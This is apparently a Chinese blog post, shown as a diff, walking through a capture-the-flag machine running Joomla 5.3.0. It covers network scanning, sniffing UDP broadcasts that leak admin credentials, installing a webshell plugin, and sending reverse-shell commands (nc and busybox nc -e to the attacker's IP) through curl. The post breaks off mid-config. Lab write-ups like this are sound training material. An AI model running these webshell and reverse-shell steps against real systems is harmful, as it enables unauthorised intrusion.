@@ -1,0 +1,561 @@
+<!DOCTYPE html>
+<html data-color-mode="light" data-dark-theme="github-light" data-light-theme="light" lang="zh-CN">
+<head>
+    <meta content="text/html; charset=utf-8" http-equiv="content-type" />
+    <meta name="viewport" content="width=device-width,initial-scale=1.0">
+    <meta http-equiv="X-UA-Compatible" content="IE=edge">
+    <link href='https://7r1umph.top/css/primer.css' rel='stylesheet' />
+    <script src='https://7r1umph.top/plugins/theme.js'></script><script src='https://7r1umph.top/plugins/StatsSidebar.js'></script>
+    <link rel="icon" href="https://7r1umph.top/image/20250320200557660.ico">
+<meta name="description" content="Hello！今天分享一下靶机 X1 的渗透过程。">
+<meta property="og:title" content="靶机 X1 渗透测试报告">
+<meta property="og:description" content="Hello！今天分享一下靶机 X1 的渗透过程。">
+<meta property="og:type" content="article">
+<meta property="og:url" content="https://7r1UMPH.github.io/post/ba-ji-%20X1%20-shen-tou-ce-shi-bao-gao.html">
+<meta property="og:image" content="https://7r1umph.top/image/20250506213832365.webp">
+<title>靶机 X1 渗透测试报告</title>
+<link href="//unpkg.com/@wooorm/starry-night@2.1.1/style/both.css" rel="stylesheet" />
+
+
+</head>
+<style>
+body{box-sizing: border-box;min-width: 200px;max-width: 900px;margin: 20px auto;padding: 45px;font-size: 16px;font-family: sans-serif;line-height: 1.25;}
+#header{display:flex;padding-bottom:8px;border-bottom: 1px solid var(--borderColor-muted, var(--color-border-muted));margin-bottom: 16px;}
+#footer {margin-top:64px; text-align: center;font-size: small;}
+
+</style>
+
+<style>
+.postTitle{margin: auto 0;font-size:40px;font-weight:bold;}
+.title-right{display:flex;margin:auto 0 0 auto;}
+.title-right .circle{padding: 14px 16px;margin-right:8px;}
+#postBody{border-bottom: 1px solid var(--color-border-default);padding-bottom:36px;}
+#postBody hr{height:2px;}
+#cmButton{height:48px;margin-top:48px;}
+#comments{margin-top:64px;}
+.g-emoji{font-size:24px;}
+@media (max-width: 600px) {
+    body {padding: 8px;}
+    .postTitle{font-size:24px;}
+}
+.copy-feedback {
+    display: none;
+    position: absolute;
+    top: 10px;
+    right: 50px;
+    color: var(--color-fg-on-emphasis);
+    background-color: var(--color-fg-muted);
+    border-radius: 3px;
+    padding: 5px 8px;
+    font-size: 12px;
+}
+</style>
+
+
+
+
+<body>
+    <div id="header">
+<h1 class="postTitle">靶机 X1 渗透测试报告</h1>
+<div class="title-right">
+    <a href="https://7r1UMPH.github.io" id="buttonHome" class="btn btn-invisible circle" title="首页">
+        <svg class="octicon" width="16" height="16">
+            <path id="pathHome" fill-rule="evenodd"></path>
+        </svg>
+    </a>
+    
+    <a href="https://github.com/7r1UMPH/7r1UMPH.github.io/issues/72" target="_blank" class="btn btn-invisible circle" title="Issue">
+        <svg class="octicon" width="16" height="16">
+            <path id="pathIssue" fill-rule="evenodd"></path>
+        </svg>
+    </a>
+    
+
+    <a class="btn btn-invisible circle" onclick="modeSwitch();" title="切换主题"style="display:none;">
+        <svg class="octicon" width="16" height="16" >
+            <path id="themeSwitch" fill-rule="evenodd"></path>
+        </svg>
+    </a>
+
+</div>
+</div>
+    <div id="content">
+<div class="markdown-body" id="postBody"><p>Hello！今天分享一下靶机 X1 的渗透过程。这靶机其实发布有几天了，但我一直没啥空。今天瞅了一眼群里，就一个人解出来了，给我整好奇了！</p>
+<p><a target="_blank" rel="noopener noreferrer nofollow" href="https://camo.githubusercontent.com/e97835b941a6e79babafc821ec355948e71434ce30db83e4f4846f0329642013/68747470733a2f2f377231554d50482e746f702f696d6167652f32303235303531313231323631373430392e77656270"><img src="https://camo.githubusercontent.com/e97835b941a6e79babafc821ec355948e71434ce30db83e4f4846f0329642013/68747470733a2f2f377231554d50482e746f702f696d6167652f32303235303531313231323631373430392e77656270" alt="image-20250511212617292" data-canonical-src="https://7r1UMPH.top/image/20250511212617409.webp" style="max-width: 100%;"></a></p>
+<h3>一、信息收集，打探敌情</h3>
+<h4>1. 老规矩，<code class="notranslate">arp-scan</code> 开路找邻居</h4>
+<div class="highlight highlight-source-shell"><pre class="notranslate">┌──(kali㉿kali)-[~]
+└─$ sudo arp-scan -l         
+[sudo] password <span class="pl-k">for</span> kali: 
+Interface: eth0, type: EN10MB, MAC: 00:0c:29:af:40:3a, IPv4: 192.168.205.206
+WARNING: Cannot open MAC/Vendor file ieee-oui.txt: Permission denied
+WARNING: Cannot open MAC/Vendor file mac-vendor.txt: Permission denied
+Starting arp-scan 1.10.0 with 256 hosts (https://github.com/royhills/arp-scan)
+192.168.205.1   00:50:56:c0:00:08       (Unknown)
+192.168.205.2   00:50:56:f4:ef:6f       (Unknown)
+192.168.205.207 08:00:27:aa:93:a3       (Unknown)  <span class="pl-k">&lt;</span>-- 目标IP
+192.168.205.254 00:50:56:ef:52:74       (Unknown)
+
+4 packets received by filter, 0 packets dropped by kernel
+Ending arp-scan 1.10.0: 256 hosts scanned <span class="pl-k">in</span> 1.957 seconds (130.81 hosts/sec). 4 responded</pre></div>
+<p>目标IP锁定：<code class="notranslate">192.168.205.207</code>。</p>
+<h4>2. <code class="notranslate">nmap</code> 扫端口，看看开了啥服务</h4>
+<div class="highlight highlight-source-shell"><pre class="notranslate">┌──(kali㉿kali)-[~]
+└─$ nmap -p- 192.168.205.207         
+Starting Nmap 7.95 ( https://nmap.org ) at 2025-05-11 09:26 EDT
+Nmap scan report <span class="pl-k">for</span> 192.168.205.207
+Host is up (0.00014s latency).
+Not shown: 65533 closed tcp ports (reset)
+PORT   STATE SERVICE
+22/tcp open  ssh
+80/tcp open  http
+MAC Address: 08:00:27:AA:93:A3 (PCS Systemtechnik/Oracle VirtualBox virtual NIC)
+
+Nmap done: 1 IP address (1 host up) scanned <span class="pl-k">in</span> 1.16 seconds</pre></div>
+<p>开放了 22 (SSH) 和 80 (HTTP) 端口。那必须先从 80 端口下手！</p>
+<h4>3. 访问80端口，初探Web应用</h4>
+<p>浏览器打开 <code class="notranslate">http://192.168.205.207/</code>：</p>
+<p><a target="_blank" rel="noopener noreferrer nofollow" href="https://camo.githubusercontent.com/436f1c07d635b2c77dbe7575ba9d24d69597f0c1832009aa86c26b508df0c7d8/68747470733a2f2f377231554d50482e746f702f696d6167652f32303235303531313231323734353236362e77656270"><img src="https://camo.githubusercontent.com/436f1c07d635b2c77dbe7575ba9d24d69597f0c1832009aa86c26b508df0c7d8/68747470733a2f2f377231554d50482e746f702f696d6167652f32303235303531313231323734353236362e77656270" alt="image-20250511212745043" data-canonical-src="https://7r1UMPH.top/image/20250511212745266.webp" style="max-width: 100%;"></a></p>
+<p>看着像是个CMS，页面上还有个 "shark"（鲨鱼）。直觉告诉我，<code class="notranslate">nuclei</code> 该启动了！</p>
+<div class="highlight highlight-source-shell"><pre class="notranslate">┌──(kali㉿kali)-[~]
+└─$ nuclei -u http://192.168.205.207/
+
+<span class="pl-c"><span class="pl-c">#</span> ... (部分输出省略) ...</span>
+
+[joomla-manifest-file] [http] [medium] http://192.168.205.207/administrator/manifests/files/joomla.xml
+[apache-detect] [http] [info] http://192.168.205.207/ [<span class="pl-s"><span class="pl-pds">"</span>Apache/2.4.62 (Debian)<span class="pl-pds">"</span></span>]
+[corebos-htaccess] [http] [info] http://192.168.205.207/htaccess.txt
+[joomla-detect:version] [http] [info] http://192.168.205.207/administrator/manifests/files/joomla.xml [<span class="pl-s"><span class="pl-pds">"</span>5.3.0<span class="pl-pds">"</span></span>]
+
+<span class="pl-c"><span class="pl-c">#</span> ... (其他检测结果) ...</span></pre></div>
+<p>是 Joomla，版本 5.3.0。查了一下，这版本3月份才发布的第三版，真够新鲜的（流鼻涕）。这意味着公开的 Exploit 估计是没戏了，除非咱能现场打个0day，那当我没说。</p>
+<p>还是老老实实找信息吧。</p>
+<h4>4. 目录爆破，看看藏了啥</h4>
+<p>用 <code class="notranslate">gobuster</code> 跑一下目录：</p>
+<div class="highlight highlight-source-shell"><pre class="notranslate">┌──(kali㉿kali)-[/mnt/hgfs/gx]
+└─$ gobuster dir -u http://192.168.205.207/ -w /usr/share/wordlists/seclists/Discovery/Web-Content/directory-list-2.3-big.txt -x php,txt,md,html
+<span class="pl-c"><span class="pl-c">#</span> ... (扫描过程和部分结果) ...</span>
+/images               (Status: 301) [Size: 319] [--<span class="pl-k">&gt;</span> http://192.168.205.207/images/]
+/index.php            (Status: 200) [Size: 9102]
+/README.txt           (Status: 200) [Size: 5034]
+/robots.txt           (Status: 200) [Size: 764]
+/administrator        (Status: 301) [Size: 326] [--<span class="pl-k">&gt;</span> http://192.168.205.207/administrator/]
+/configuration.php    (Status: 200) [Size: 0] 
+/htaccess.txt         (Status: 200) [Size: 6899]
+<span class="pl-c"><span class="pl-c">#</span> ... (其他301重定向) ...</span></pre></div>
+<p>扫出来一堆301，有用的不多。</p>
+<ul>
+<li>
+<p><code class="notranslate">/index.php</code>：首页，忽略。</p>
+</li>
+<li>
+<p><code class="notranslate">/README.txt</code>：没啥隐藏信息。</p>
+</li>
+<li>
+<p><code class="notranslate">/robots.txt</code>：内容如下：</p>
+<pre class="notranslate"><code class="notranslate">User-agent: *
+Disallow: /administrator/
+Disallow: /api/
+Disallow: /bin/
+Disallow: /cache/
+Disallow: /cli/
+Disallow: /components/
+Disallow: /includes/
+Disallow: /installation/
+Disallow: /language/
+Disallow: /layouts/
+Disallow: /libraries/
+Disallow: /logs/
+Disallow: /modules/
+Disallow: /plugins/ 
+Disallow: /tmp/
+</code></pre>
+<p><code class="notranslate">/plugins/</code> 目录看着可疑，但访问了一下，不给看...</p>
+</li>
+<li>
+<p><code class="notranslate">/htaccess.txt</code>：也没啥隐藏信息。</p>
+</li>
+</ul>
+<h4>5. Joomla专用扫描器 <code class="notranslate">joomscan</code> 登场</h4>
+<p>找了半天没啥进展，掏出了 Joomla 专用扫描器 <code class="notranslate">joomscan</code>：</p>
+<div class="highlight highlight-source-shell"><pre class="notranslate">┌──(kali㉿kali)-[~]
+└─$ joomscan --url http://192.168.205.207/
+<span class="pl-c"><span class="pl-c">#</span> ... (扫描过程) ...</span>
+[+] FireWall Detector
+[++] Firewall not detected
+
+[+] Detecting Joomla Version
+[++] Joomla 5.3.0
+
+[+] Core Joomla Vulnerability
+[++] Target Joomla core is not vulnerable
+
+[+] Checking Directory Listing
+[++] directory has directory listing <span class="pl-c1">:</span> 
+http://192.168.205.207/administrator/components
+http://192.168.205.207/administrator/modules
+http://192.168.205.207/administrator/templates
+http://192.168.205.207/images/banners
+<span class="pl-c"><span class="pl-c">#</span> ... (其他发现) ...</span></pre></div>
+<p><code class="notranslate">joomscan</code> 也没发现啥实质性的漏洞，就列了几个能访问的目录。我还以为能扒拉出个什么插件漏洞呢，结果这CMS比我钱包都干净。</p>
+<h4>6. 难道不是80端口？排查其他可能性</h4>
+<p><strong>IPv6 瞅瞅：</strong></p>
+<div class="highlight highlight-source-shell"><pre class="notranslate">┌──(kali㉿kali)-[~]
+└─$ ping6 -I eth0 ff02::1
+<span class="pl-c"><span class="pl-c">#</span> ... (ping6 正常，发现 fe80::a00:27ff:feaa:93a3%eth0) ...</span>
+└─$ nmap -6 -p- fe80::a00:27ff:feaa:93a3%eth0
+<span class="pl-c"><span class="pl-c">#</span> ... (扫描结果还是只有 22 和 80) ...</span></pre></div>
+<p>IPv6 这边没啥幺蛾子。</p>
+<p><strong>UDP 端口扫一下常见的：</strong></p>
+<div class="highlight highlight-source-shell"><pre class="notranslate">┌──(kali㉿kali)-[~]
+└─$ nmap -sU --top-ports 100 192.168.205.207 
+<span class="pl-c"><span class="pl-c">#</span> ... (扫描结果) ...</span>
+PORT   STATE         SERVICE
+68/udp open<span class="pl-k">|</span>filtered dhcpc</pre></div>
+<p>常见的100个UDP端口也没啥发现（如果他端口开在100名开外，那对我可真是绝杀了）。</p>
+<p>这下给我整怀疑人生了，去瞅了眼靶机难度：<br>
+<a target="_blank" rel="noopener noreferrer nofollow" href="https://camo.githubusercontent.com/3e087191a52539bf775c6fc5834552b97786c84b350ff360bd55a9177bcace40/68747470733a2f2f377231554d50482e746f702f696d6167652f32303235303531313231353231383330312e77656270"><img src="https://camo.githubusercontent.com/3e087191a52539bf775c6fc5834552b97786c84b350ff360bd55a9177bcace40/68747470733a2f2f377231554d50482e746f702f696d6167652f32303235303531313231353231383330312e77656270" alt="image-20250511215218183" data-canonical-src="https://7r1UMPH.top/image/20250511215218301.webp" style="max-width: 100%;"></a><br>
+"比较简单"？？？难道是我变菜了？？？</p>
+<h4>7. 峰回路转，监听网络流量！</h4>
+<p>之前遇到过会定时发包的靶机，试试看有没有动静。<br>
+<code class="notranslate">tcpdump</code> 监听 ICMP：</p>
+<div class="highlight highlight-source-shell"><pre class="notranslate">┌──(kali㉿kali)-[~]
+└─$ sudo tcpdump -A -n icmp
+<span class="pl-c"><span class="pl-c">#</span> ... (一片寂静) ...</span></pre></div>
+<p>毛线没有，啊啊啊！TCP的包也看了一堆，除了我自己的流量，也没啥特别的（私人的包就不贴上来了）。</p>
+<p><strong>最后希望，UDP流量：</strong></p>
+<div class="highlight highlight-source-shell"><pre class="notranslate">┌──(kali㉿kali)-[~]
+└─$ sudo tcpdump -A -n udp 
+tcpdump: verbose output suppressed, use -v[v]... <span class="pl-k">for</span> full protocol decode
+listening on eth0, link-type EN10MB (Ethernet), snapshot length 262144 bytes
+09:57:33.971737 IP 192.168.205.207.48368 <span class="pl-k">&gt;</span> 255.255.255.255.5000: UDP, length 1
+E.....@.@................       h.8.................
+09:57:33.971797 IP 192.168.205.207.48368 <span class="pl-k">&gt;</span> 255.255.255.255.5000: UDP, length 1
+E.....@.@................       h.8.................
+<span class="pl-c"><span class="pl-c">#</span> ... (持续出现类似的 UDP 包，目标端口 5000，长度为 1) ...</span>
+09:58:02.059998 IP 192.168.205.207.39435 <span class="pl-k">&gt;</span> 255.255.255.255.5000: UDP, length 1
+E...+t@.@................       Q.r.................
+<span class="pl-c"><span class="pl-c">#</span> ... (数据内容在变化，但都是单个字符) ...</span></pre></div>
+<p>我去！在这儿等着我呢！目标主机 <code class="notranslate">192.168.205.207</code> 在往广播地址 <code class="notranslate">255.255.255.255</code> 的 UDP 5000 端口发包，每次一个字符。<br>
+这不就对上了吗？首页那个 "shark"（鲨鱼）... <strong>Wireshark</strong>！草，原来是这个意思！</p>
+<p>赶紧把这些字符提取出来。一个个复制粘贴太蠢了，不理解但尊重想那么干的勇士。<br>
+仔细观察发现，它是在UDP 5000端口下发送数据。用 <code class="notranslate">nc</code> 试试：</p>
+<div class="highlight highlight-source-shell"><pre class="notranslate">┌──(kali㉿kali)-[~]
+└─$ nc -lu -p 5000
+r^C </pre></div>
+<p>等了一会儿，<code class="notranslate">nc</code> 只能接收一个字符，而且接收完就断了。这不行啊，得想个办法持续接收。我去问了GPT，它给了个用 <code class="notranslate">ncat</code> 的方法：</p>
+<div class="highlight highlight-source-shell"><pre class="notranslate">┌──(kali㉿kali)-[~]
+└─$ ncat -luk -p 5000
+8182602383ce1root:00dae9e3052fb2255408182602383ce1^C</pre></div>
+<p>成了！捕获到一串字符：<code class="notranslate">root:00dae9e3052fb2255408182602383ce1</code></p>
+<h3>二、获取初始访问权限</h3>
+<p>按照我对群主的理解，就算靶机标的“比较简单”，也不会直接就送个 root 密码。这串 <code class="notranslate">root:00dae9e3052fb2255408182602383ce1</code> 看着就像用户名和密码（或者密码哈希），这应该是 Joomla 后台 <code class="notranslate">/administrator/</code> 的登录凭据。</p>
+<h4>1. 登录Joomla后台</h4>
+<p>用用户名 <code class="notranslate">root</code> 和密码 <code class="notranslate">00dae9e3052fb2255408182602383ce1</code> 尝试登录 <code class="notranslate">http://192.168.205.207/administrator/</code>。</p>
+<p>成功登录！我还以为要解个Hash呢。</p>
+<h4>2. 上传Webshell插件</h4>
+<p>进了后台，这种CMS最常见的GetShell方式就是通过插件上传Webshell。</p>
+<p><a target="_blank" rel="noopener noreferrer nofollow" href="https://camo.githubusercontent.com/e5f614e0361091bfdd8c1682b69eec189409e2eedd09f254c8947404fb1a86eb/68747470733a2f2f377231554d50482e746f702f696d6167652f32303235303531313232323532333831392e77656270"><img src="https://camo.githubusercontent.com/e5f614e0361091bfdd8c1682b69eec189409e2eedd09f254c8947404fb1a86eb/68747470733a2f2f377231554d50482e746f702f696d6167652f32303235303531313232323532333831392e77656270" alt="image-20250511222523465" data-canonical-src="https://7r1UMPH.top/image/20250511222523819.webp" style="max-width: 100%;"></a>在GitHub上搜了一下 "Joomla webshell plugin"，很快找到了一个现成的：<br>
+<code class="notranslate">https://github.com/p0dalirius/Joomla-webshell-plugin</code></p>
+<p><a target="_blank" rel="noopener noreferrer nofollow" href="https://camo.githubusercontent.com/62f54fc50143e28ba4f10b685d92d42f9454e83cd3cca02822b69d30f132c1aa/68747470733a2f2f377231554d50482e746f702f696d6167652f32303235303531313232323631333931372e77656270"><img src="https://camo.githubusercontent.com/62f54fc50143e28ba4f10b685d92d42f9454e83cd3cca02822b69d30f132c1aa/68747470733a2f2f377231554d50482e746f702f696d6167652f32303235303531313232323631333931372e77656270" alt="image-20250511222613763" data-canonical-src="https://7r1UMPH.top/image/20250511222613917.webp" style="max-width: 100%;"></a></p>
+<p>根据项目说明，在它的 <code class="notranslate">dist</code> 目录里下载一个打包好的 <code class="notranslate">mod_webshell.zip</code> 就行。</p>
+<p>回到Joomla后台，"System" -&gt; "Install" -&gt; "Extensions"，上传并安装 <code class="notranslate">mod_webshell.zip</code>。<br>
+安装成功后，根据插件的说明文档，可以通过访问特定路径来执行命令。</p>
+<p><a target="_blank" rel="noopener noreferrer nofollow" href="https://camo.githubusercontent.com/a31b97130ee4c12f30438598b828e90725218743ba81b05f52ec6adacc5caff5/68747470733a2f2f377231554d50482e746f702f696d6167652f32303235303531313232323935373230342e77656270"><img src="https://camo.githubusercontent.com/a31b97130ee4c12f30438598b828e90725218743ba81b05f52ec6adacc5caff5/68747470733a2f2f377231554d50482e746f702f696d6167652f32303235303531313232323935373230342e77656270" alt="image-20250511222957053" data-canonical-src="https://7r1UMPH.top/image/20250511222957204.webp" style="max-width: 100%;"></a></p>
+<p>测试一下命令执行：</p>
+<div class="highlight highlight-source-shell"><pre class="notranslate">┌──(kali㉿kali)-[/mnt/hgfs/gx]
+└─$ curl -X POST <span class="pl-s"><span class="pl-pds">'</span>http://192.168.205.207/modules/mod_webshell/mod_webshell.php<span class="pl-pds">'</span></span> --data <span class="pl-s"><span class="pl-pds">"</span>action=exec&amp;cmd=id<span class="pl-pds">"</span></span>
+{<span class="pl-s"><span class="pl-pds">"</span>stdout<span class="pl-pds">"</span></span>:<span class="pl-s"><span class="pl-pds">"</span>uid=33(www-data) gid=33(www-data) groups=33(www-data)\n<span class="pl-pds">"</span></span>,<span class="pl-s"><span class="pl-pds">"</span>stderr<span class="pl-pds">"</span></span>:<span class="pl-s"><span class="pl-pds">"</span><span class="pl-pds">"</span></span>,<span class="pl-s"><span class="pl-pds">"</span>exec<span class="pl-pds">"</span></span>:<span class="pl-s"><span class="pl-pds">"</span>id<span class="pl-pds">"</span></span>}</pre></div>
+<p>命令成功执行，当前用户是 <code class="notranslate">www-data</code>。</p>
+<h3>三、反弹Shell与提权</h3>
+<h4>1. 获取反弹Shell</h4>
+<p>先在Kali上监听端口：</p>
+<div class="highlight highlight-source-shell"><pre class="notranslate">┌──(kali㉿kali)-[~]
+└─$ nc -lvnp 8888    
+listening on [any] 8888 ...</pre></div>
+<p>然后通过Webshell执行反弹命令：</p>
+<div class="highlight highlight-source-shell"><pre class="notranslate">┌──(kali㉿kali)-[/mnt/hgfs/gx]
+└─$ curl -X POST <span class="pl-s"><span class="pl-pds">'</span>http://192.168.205.207/modules/mod_webshell/mod_webshell.php<span class="pl-pds">'</span></span> --data <span class="pl-s"><span class="pl-pds">"</span>action=exec&amp;cmd=nc 192.168.205.206 8888 -e /bin/bash<span class="pl-pds">"</span></span>
+{<span class="pl-s"><span class="pl-pds">"</span>stdout<span class="pl-pds">"</span></span>:<span class="pl-s"><span class="pl-pds">"</span><span class="pl-pds">"</span></span>,<span class="pl-s"><span class="pl-pds">"</span>stderr<span class="pl-pds">"</span></span>:<span class="pl-s"><span class="pl-pds">"</span>sh: 1: nc: not found\n<span class="pl-pds">"</span></span>,<span class="pl-s"><span class="pl-pds">"</span>exec<span class="pl-pds">"</span></span>:<span class="pl-s"><span class="pl-pds">"</span>nc 192.168.205.206 8888 -e \/bin\/bash<span class="pl-pds">"</span></span>}</pre></div>
+<p>目标机上没有 <code class="notranslate">nc</code>。试试 <code class="notranslate">busybox nc</code>：</p>
+<div class="highlight highlight-source-shell"><pre class="notranslate">┌──(kali㉿kali)-[/mnt/hgfs/gx]                                                                                                                                                     
+└─$ curl -X POST <span class="pl-s"><span class="pl-pds">'</span>http://192.168.205.207/modules/mod_webshell/mod_webshell.php<span class="pl-pds">'</span></span> --data <span class="pl-s"><span class="pl-pds">"</span>action=exec&amp;cmd=busybox nc 192.168.205.206 8888 -e /bin/sh<span class="pl-pds">"</span></span></pre></div>
+<p>这次成功了！Kali的监听器收到了连接：</p>
+<div class="highlight highlight-source-shell"><pre class="notranslate">┌──(kali㉿kali)-[~]                                                                                                                                                                
+└─$ nc -lvnp 8888                                                                                                                                                                  
+listening on [any] 8888 ...                                                                                                                                                        
+connect to [192.168.205.206] from (UNKNOWN) [192.168.205.207] 39696</pre></div>
+<h4>2. 稳定Shell</h4>
+<p>得到的初始Shell不太好用，需要稳定一下：</p>
+<div class="highlight highlight-source-shell"><pre class="notranslate"><span class="pl-c"><span class="pl-c">#</span> 在反弹回来的shell里执行</span>
+script /dev/null -c bash
+<span class="pl-c"><span class="pl-c">#</span> 按 Ctrl+Z 放到后台</span>
+<span class="pl-c"><span class="pl-c">#</span> 在Kali终端执行</span>
+stty raw -echo<span class="pl-k">;</span> <span class="pl-c1">fg</span>
+<span class="pl-c"><span class="pl-c">#</span> 回车，然后继续在反弹shell里执行</span>
+reset xterm
+<span class="pl-k">export</span> TERM=xterm
+<span class="pl-k">export</span> SHELL=/bin/bash
+stty rows 24 columns 80 <span class="pl-c"><span class="pl-c">#</span> 根据自己终端调整</span></pre></div>
+<p>OK，现在有个像样的Shell了。</p>
+<h4>3. 权限提升 (<code class="notranslate">www-data</code> -&gt; <code class="notranslate">root</code>)</h4>
+<p>当前用户 <code class="notranslate">www-data</code>：</p>
+<pre class="notranslate"><code class="notranslate">www-data@X1:/$ id
+uid=33(www-data) gid=33(www-data) groups=33(www-data)
+</code></pre>
+<p>到处翻翻看，先看看 <code class="notranslate">/home</code> 和 <code class="notranslate">/var/www</code> 目录：</p>
+<div class="highlight highlight-source-shell"><pre class="notranslate">www-data@X1:/$ <span class="pl-c1">cd</span> /home/
+www-data@X1:/home$ ls -al
+total 12
+drwxr-xr-x  3 root    root    4096 Apr 11 22:27 <span class="pl-c1">.</span>
+drwxr-xr-x 19 root    root    4096 May 10 03:38 ..
+drwx------  2 welcome welcome 4096 May 10 03:44 welcome
+www-data@X1:/home$ <span class="pl-c1">cd</span> /var/www/html
+www-data@X1:/var/www/html$ ls -al 
+<span class="pl-c"><span class="pl-c">#</span> ... (Joomla 文件列表) ...</span>
+www-data@X1:/var/www/html$ cat web.config.txt 
+<span class="pl-k">&lt;</span><span class="pl-k">?</span>xml version=<span class="pl-s"><span class="pl-pds">"</span>1.0<span class="pl-pds">"</span></span> encoding=<span class="pl-s"><span class="pl-pds">"</span>UTF-8<span class="pl-pds">"</span></span><span class="pl-k">?</span><span class="pl-k">&gt;</span>
+<span class="pl-k">&lt;</span>configuration<span class="pl-k">&gt;</span>
+   <span class="pl-k">&lt;</span>location path=<span class="pl-s"><span class="pl-pds">"</span>.<span class="pl-pds">"</span></span><span class="pl-k">&gt;</span>
+   <span class="pl-k">&lt;</span>system.webServer<span class="pl-k">&gt;</span>
+       <span class="pl-k">&lt;</span>directoryBrowse enabled=<span class="pl-s"><span class="pl-pds">"</span>false<span class="pl-pds">"</span></span> /<span class="pl-k">&gt;</span>
+       <span class="pl-k">&lt;</span>rewrite<span class="pl-k">&gt;</span>
+           <span class="pl-k">&lt;</span>rules<span class="pl-k">&gt;</span>
+               <span class="pl-k">&lt;</span>rule name=<span class="pl-s"><span class="pl-pds">"</span>Joomla! Common Exploits Prevention<span class="pl-pds">"</span></span> stopProcessing=<span class="pl-s"><span class="pl-pds">"</span>true<span class="pl-pds">"</span></span><span class="pl-k">&gt;</span>
+                   <span class="pl-k">&lt;</span>match url=<span class="pl-s"><span class="pl-pds">"</span>^(.*)$<span class="pl-pds">"</span></span> ignoreCase=<span class="pl-s"><span class="pl-pds">"</span>false<span class="pl-pds">"</span></span> /<span class="pl-k">&gt;</span>
+                   <span class="pl-k">&lt;</span>conditions logicalGrouping=<span class="pl-s"><span class="pl-pds">"</span>MatchAny<span class="pl-pds">"</span></span><span class="pl-k">&gt;</span>
+                       <span class="pl-k">&lt;</span>add input=<span class="pl-s"><span class="pl-pds">"</span>{QUERY_STRING}<span class="pl-pds">"</span></span> pattern=<span class="pl-s"><span class="pl-pds">"</span>base64_encode[^(]*\([^)]*\)<span class="pl-pds">"</span></span> ignoreCase=<span class="pl-s"><span class="pl-pds">"</span>false<span class="pl-pds">"</span></span> /<span class="pl-k">&gt;</span>
+                       <span class="pl-k">&lt;</span>add input=<span class="pl-s"><span class="pl-pds">"</span>{QUERY_STRING}<span class="pl-pds">"</span></span> pattern=<span class="pl-s"><span class="pl-pds">"</span>(&amp;gt;|%3C)([^s]*s)+cript.*(&amp;lt;|%3E)<span class="pl-pds">"</span></span> /<span class="pl-k">&gt;</span>
+                       <span class="pl-k">&lt;</span>add input=<span class="pl-s"><span class="pl-pds">"</span>{QUERY_STRING}<span class="pl-pds">"</span></span> pattern=<span class="pl-s"><span class="pl-pds">"</span>GLOBALS(=|\[|\%[0-9A-Z]{0,2})<span class="pl-pds">"</span></span> ignoreCase=<span class="pl-s"><span class="pl-pds">"</span>false<span class="pl-pds">"</span></span> /<span class="pl-k">&gt;</span>
+                       <span class="pl-k">&lt;</span>add input=<span class="pl-s"><span class="pl-pds">"</span>{QUERY_STRING}<span class="pl-pds">"</span></span> pattern=<span class="pl-s"><span class="pl-pds">"</span>_REQUEST(=|\[|\%[0-9A-Z]{0,2})<span class="pl-pds">"</span></span> ignoreCase=<span class="pl-s"><span class="pl-pds">"</span>false<span class="pl-pds">"</span></span> /<span class="pl-k">&gt;</span>
+                   <span class="pl-k">&lt;</span>/conditions<span class="pl-k">&gt;</span>
+                   <span class="pl-k">&lt;</span>action type=<span class="pl-s"><span class="pl-pds">"</span>CustomResponse<span class="pl-pds">"</span></span> url=<span class="pl-s"><span class="pl-pds">"</span>index.php<span class="pl-pds">"</span></span> statusCode=<span class="pl-s"><span class="pl-pds">"</span>403<span class="pl-pds">"</span></span> statusReason=<span class="pl-s"><span class="pl-pds">"</span>Forbidden<span class="pl-pds">"</span></span> statusDescription=<span class="pl-s"><span class="pl-pds">"</span>Forbidden<span class="pl-pds">"</span></span> /<span class="pl-k">&gt;</span>
+               <span class="pl-k">&lt;</span>/rule<span class="pl-k">&gt;</span>
+               <span class="pl-k">&lt;</span>rule name=<span class="pl-s"><span class="pl-pds">"</span>Joomla! API Application SEF URLs<span class="pl-pds">"</span></span><span class="pl-k">&gt;</span>
+                   <span class="pl-k">&lt;</span>match url=<span class="pl-s"><span class="pl-pds">"</span>^api/(.*)<span class="pl-pds">"</span></span> ignoreCase=<span class="pl-s"><span class="pl-pds">"</span>false<span class="pl-pds">"</span></span> /<span class="pl-k">&gt;</span>
+                   <span class="pl-k">&lt;</span>conditions logicalGrouping=<span class="pl-s"><span class="pl-pds">"</span>MatchAll<span class="pl-pds">"</span></span><span class="pl-k">&gt;</span>
+                     <span class="pl-k">&lt;</span>add input=<span class="pl-s"><span class="pl-pds">"</span>{URL}<span class="pl-pds">"</span></span> pattern=<span class="pl-s"><span class="pl-pds">"</span>^/api/index.php<span class="pl-pds">"</span></span> ignoreCase=<span class="pl-s"><span class="pl-pds">"</span>true<span class="pl-pds">"</span></span> negate=<span class="pl-s"><span class="pl-pds">"</span>true<span class="pl-pds">"</span></span> /<span class="pl-k">&gt;</span>
+                     <span class="pl-k">&lt;</span>add input=<span class="pl-s"><span class="pl-pds">"</span>{REQUEST_FILENAME}<span class="pl-pds">"</span></span> matchType=<span class="pl-s"><span class="pl-pds">"</span>IsFile<span class="pl-pds">"</span></span> ignoreCase=<span class="pl-s"><span class="pl-pds">"</span>false<span class="pl-pds">"</span></span> negate=<span class="pl-s"><span class="pl-pds">"</span>true<span class="pl-pds">"</span></span> /<span class="pl-k">&gt;</span>
+                     <span class="pl-k">&lt;</span>add input=<span class="pl-s"><span class="pl-pds">"</span>{REQUEST_FILENAME}<span class="pl-pds">"</span></span> matchType=<span class="pl-s"><span class="pl-pds">"</span>IsDirectory<span class="pl-pds">"</span></span> ignoreCase=<span class="pl-s"><span class="pl-pds">"</span>false<span class="pl-pds">"</span></span> negate=<span class="pl-s"><span class="pl-pds">"</span>true<span class="pl-pds">"</span></span> /<span class="pl-k">&gt;</span>
+                   <span class="pl-k">&lt;</span>/conditions<span class="pl-k">&gt;</span>
+                   <span class="pl-k">&lt;</span>action type=<span class="pl-s"><span class="pl-pds">"</span>Rewrite<span class="pl-pds">"</span></span> url=<span class="pl-s"><span class="pl-pds">"</span>api/index.php<span class="pl-pds">"</span></span> /<span class="pl-k">&gt;</span>
+               <span class="pl-k">&lt;</span>/rule<span class="pl-k">&gt;</span>
+               <span class="pl-k">&lt;</span>rule name=<span class="pl-s"><span class="pl-pds">"</span>Joomla! Public Frontend SEF URLs<span class="pl-pds">"</span></span><span class="pl-k">&gt;</span>
